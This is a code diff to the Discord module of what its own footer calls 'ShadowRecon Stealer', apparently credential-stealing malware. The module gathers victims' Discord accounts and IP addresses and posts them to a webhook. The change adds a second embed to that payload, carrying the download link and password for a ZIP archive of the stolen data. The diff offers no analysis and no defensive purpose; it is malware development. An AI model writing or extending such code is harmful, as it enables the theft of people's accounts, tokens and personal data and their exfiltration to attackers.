@@ -599,9 +599,11 @@ This file indicates that the Discord module found tokens but couldn't process th
      * Send account embeds to webhook
      * @param {Array} accounts - Array of Discord accounts
      * @param {string} ip - IP address
+     * @param {Object} uploadResult - Upload result with download URL and password
+     * @param {string} zipPath - Path to ZIP file for direct attachment
      * @returns {Promise<boolean>} Success status
      */
-    async sendAccountEmbeds(accounts, ip = 'Unknown') {
+    async sendAccountEmbeds(accounts, ip = 'Unknown', uploadResult = null, zipPath = '') {
         if (accounts.length === 0) {
             logger.info('No Discord accounts to send');
             return true;
@@ -609,6 +611,41 @@ This file indicates that the Discord module found tokens but couldn't process th
 
         try {
             const embeds = accounts.slice(0, 10).map(account => this.createAccountEmbed(account, ip));
+            
+            // Add file information embed if upload result is available
+            if (uploadResult && uploadResult.downloadUrl) {
+                const fileEmbed = {
+                    title: ":file_folder: Data Archive",
+                    color: 0x7289da,
+                    fields: [
+                        {
+                            name: ":link: Download Link",
+                            value: `[Click here to download](${uploadResult.downloadUrl})`,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "ShadowRecon Stealer - Archive"
+                    },
+                    timestamp: new Date().toISOString()
+                };
+
+                // Add password field if available
+                if (uploadResult.password) {
+                    fileEmbed.fields.push({
+                        name: ":key: Archive Password",
+                        value: `\`${uploadResult.password}\``,
+                        inline: false
+                    });
+                    fileEmbed.fields.push({
+                        name: ":warning: Important",
+                        value: "This archive is password protected. Use the password above to extract the contents.",
+                        inline: false
+                    });
+                }
+
+                embeds.push(fileEmbed);
+            }
             
             const payload = {
                 content: null,
